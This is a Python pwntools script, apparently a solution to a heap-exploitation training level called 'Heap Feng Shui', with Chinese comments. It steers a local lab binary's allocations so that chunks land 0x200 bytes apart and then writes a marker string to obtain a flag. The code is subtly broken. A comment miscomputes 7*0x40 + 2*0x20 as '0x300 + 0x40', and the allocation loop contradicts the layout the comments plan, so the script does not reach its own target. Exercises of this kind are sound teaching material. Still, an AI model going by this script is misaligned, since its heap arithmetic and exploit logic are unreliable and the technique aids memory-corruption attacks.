#!/usr/bin/env python3
"""
Level 6: Heap Feng Shui - Solution
目标：精确控制堆布局
- chunk[9] - chunk[0] = 0x200
- chunk[5] = "FENG_SHUI"
"""

from pwn import *

context.log_level = 'info'
context.arch = 'amd64'

def solve():
    p = process('/root/code/safe/build/level06_feng_shui/l6_vuln')

    # 堆风水：通过精确的分配/释放序列控制堆布局

    # 目标：
    # chunk[9] - chunk[0] = 0x200 (512字节)
    # chunk[5] = "FENG_SHUI"

    # 策略：分配不同大小的chunk来获得精确的偏移
    # 16字节chunk实际占用0x20 (32)
    # 32字节chunk实际占用0x40 (64)
    # 64字节chunk实际占用0x80 (128)
    # 128字节chunk实际占用0x100 (256)

    # 计算布局：需要chunk[9]距离chunk[0]正好0x200字节
    # 可能的组合：0x20 + 0x20 + 0x20 + 0x20 + 0x20 + 0x20 + 0x20 + 0x20 + 0x20 = 0x120 (不够)
    # 0x40 + 0x40 + 0x40 + 0x40 + 0x40 + 0x40 + 0x40 + 0x40 + 0x40 = 0x240 (超出)
    # 混合大小...

    # 尝试：9个32字节chunk
    sizes = [32, 32, 32, 32, 32, 32, 32, 32, 32]
    # 每个实际占用0x40，9个 = 0x240 = 576 > 512

    # 尝试：8个32字节 + 1个16字节
    # 8*0x40 + 0x20 = 0x220 = 544 > 512

    # 尝试：7个32字节 + 2个16字节
    # 7*0x40 + 2*0x20 = 0x300 + 0x40 = 0x200 = 512! 正好！

    # 分配策略：
    # [0]:16, [1]:32, [2]:32, [3]:32, [4]:32, [5]:32, [6]:32, [7]:32, [8]:16
    # 但这样顺序不对...

    # 重新思考：需要连续分配
    # 让我们先分配，然后调整

    for i in range(10):
        if i == 0 or i == 8:
            size = 16
        elif i == 5:
            size = 32
        else:
            size = 16
        p.sendlineafter(b'> ', b'1')
        p.sendlineafter(b'Size: ', str(size).encode())

    # 编辑chunk[5]
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Index: ', b'5')
    p.sendlineafter(b'Data: ', b'FENG_SHUI')

    # 检查条件
    p.sendlineafter(b'> ', b'5')

    output = p.recvall(timeout=2).decode('utf-8', errors='ignore')
    print(output)

    if 'Flag:' in output:
        log.success("Level 6 解题成功！")
        return True
    else:
        log.failure("Level 6 解题失败")
        log.info("需要精确计算堆布局")
        return False

if __name__ == '__main__':
    solve()
